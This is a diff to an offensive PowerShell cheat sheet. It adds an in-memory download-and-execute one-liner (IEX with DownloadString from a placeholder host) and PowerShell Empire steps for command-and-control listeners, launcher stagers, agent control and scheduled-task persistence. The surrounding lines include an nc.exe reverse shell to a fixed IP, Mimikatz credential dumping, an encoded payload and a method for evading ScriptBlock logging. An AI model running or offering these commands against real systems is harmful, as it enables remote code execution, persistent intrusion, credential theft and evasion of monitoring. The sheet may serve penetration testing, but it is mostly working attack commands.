@@ -69,7 +69,8 @@ Find Logged In Users----Get-NetLoggedOn -ComputerName <ComputerName>
 
 Basic NC connectback----powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'
 One-Liner (no script on disk)----Invoke-Expression
-Run remote script (in-memory)----DownloadString
+Run remote script (in-memory)----powershell -Command "$ip='http://A.B.C.D:22/launcher.ps1; IEX (New-Object Net.webclient).DownloadString($ip)"
+Run remote HTA (in-memory)----
 Encoded Commands----##-encodedcommand;-e;-en;-enc
 
 
@@ -77,6 +78,14 @@ Encoded Commands----##-encodedcommand;-e;-en;-enc
 Dump Creds----Invoke-Mimikatz -DumpCreds -ComputerName remotehost
 Execute Classic Mimikatz Commands----Invoke-Mimikatz -Command '"privilege::debug"'
 
+##PowerShell Empire
+Set up a HTTP Listener (C2 profile)----listeners; uselistener http; set Host a.b.c.d:8080; execute;
+Create an Empire launcher (rat/aka way to get shellz)----listeners; usestager multi/launcher; set Listener http; set OutFile /opt/agent.ps1; generate
+List all Agents----agents
+Interact with an Agent----interact AGENT1
+Rename an Agent----rename AGENTNEW
+Persist with a Module----usemodule persistence/userland/schtasks; set Listener http; set IdleTime 2; set Agent autorun; run
+Import a PowerShell Script and Run----agents; interact AGENT1; scirptimport /opt/Do-Thing.ps1; scriptcmd Do-Thing
 Empire Powershell Payload----powershell -noP -sta -w1 -enc <base64-encoded-payload>
 ScriptBlock Logging----Logging feature that captures PS scripts in readable form.  Empire may bypass by unhooking it via "cachedGroupPolicySettings" variable manipulation.  It may also nullify the "suspicious strings" array.  
 
